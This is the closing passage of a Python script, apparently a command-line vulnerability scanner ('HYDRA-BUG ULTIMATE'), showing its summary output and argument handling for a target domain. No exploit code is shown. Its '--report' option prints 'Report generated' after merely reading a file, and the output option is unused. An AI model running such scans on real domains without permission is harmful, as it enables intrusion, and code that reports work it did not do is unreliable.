            cprint("\n[+] No critical or high severity vulnerabilities found", Colors.GREEN, bold=True)
        
        cprint("\n[*] Total time: {}s".format(int(time.time() - self.start_time)), Colors.DIM)

# ==================== MAIN ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="HYDRA-BUG ULTIMATE - Elite Bug Hunting Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 hydra_bug_ultimate.py -t example.com
  python3 hydra_bug_ultimate.py -t example.com --elite
  python3 hydra_bug_ultimate.py -t example.com --report
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target domain")
    parser.add_argument("--elite", action="store_true", help="Run elite scan")
    parser.add_argument("--report", action="store_true", help="Generate report only")
    parser.add_argument("-o", "--output", help="Output directory")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.report:
        cprint("[*] Generating report...", Colors.BLUE)
        try:
            with open("elite_report.json", 'r') as f:
                results = json.load(f)
            cprint("[+] Report generated", Colors.GREEN)
        except:
            cprint("[-] No report found", Colors.RED)
        sys.exit(0)
    
    hydra = HydraBugUltimate(args.target)
    hydra.run_elite_scan()
    hydra.show_elite_summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Operation interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[ERROR] {e}", Colors.RED)
        sys.exit(1)
